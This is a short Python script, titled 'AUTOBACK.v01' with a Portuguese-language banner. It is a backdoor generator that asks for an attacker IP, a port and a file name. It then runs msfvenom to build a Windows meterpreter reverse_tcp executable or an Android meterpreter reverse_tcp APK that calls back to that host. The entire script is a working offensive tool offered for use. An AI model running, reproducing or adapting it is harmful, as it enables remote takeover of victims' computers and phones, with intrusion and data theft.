import socket
import time
import os
def main():
	print("""
░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░██║░░░██║░░░██║░░██║██████╦╝███████║██║░░╚═╝█████═╝░
██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔══██╗██╔══██║██║░░██╗██╔═██╗░
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██████╦╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒ 
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒ feito por: Kira"
▒▒█▒▒███████▄██████▒▒▒ 25 de jun de 2021"
▒▒▒▒▒██████████████▒▒▒ AUTOBACK.v01"
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
			|======GERADOR DE BACKDOOR======|
			| [ 1 ] Windows                 |
			| [ 2 ] Android                 |
			|===============================|
			""")
	opção = int(input("Escolha a opção para Windows(1) ou para Android(2): "))
	ip = input("Digite o seu ip: ")
	port = input("Digite a porta, Recomendado 4444: ")
	nome = input("Digite o nome do seu backdoor: ")
	if opção == 1:
			os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST={ip} LPORT={port} R > {nome}.exe")
			print("BACKDOOR CRIADO COM SUCESSO!");time.sleep(2)
	elif opção == 2:
		os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {nome}.apk")
		print("BACKDOOR CRIADO COM SUCESSO!");time.sleep(2)
	else:
		print("Opção Inválida");time.sleep(2)
